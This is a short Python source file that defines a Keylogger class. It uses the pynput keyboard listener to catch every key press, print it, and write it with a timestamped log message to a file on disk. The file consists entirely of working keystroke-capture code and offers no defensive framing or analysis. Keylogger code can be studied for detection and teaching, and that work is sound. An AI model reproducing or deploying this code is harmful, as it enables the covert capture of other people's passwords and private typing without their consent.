from src.model.persistance.directory_manager import *
from src.model.persistance.file_manager import *
from src.model.util.constants import *
from src.model.util.logger import *

from pynput import keyboard

class Keylogger:
    
    def __init__(self) -> None:
        self.directory_manager = DirectoryManager()
        self.file_manager = FileManager()
        self.logger = Logger(Constants.PATH_LOG, Constants.FILE_NAME_LOG)

    def on_key_pressed(self, key) -> bool:
        key = str(key).replace("'", "")
        print("Pressed: " + key)
        self.file_manager.write_file(Constants.PATH_LOG, Constants.FILE_NAME_LOG, self.logger.create_log_message(Constants.LOG_MESSAGE_KEY_PRESSED + key))
        return True
   
    def write_log(self):
        pass

    def start(self):
        with keyboard.Listener(
            on_press=self.on_key_pressed) as listener:
            listener.join()
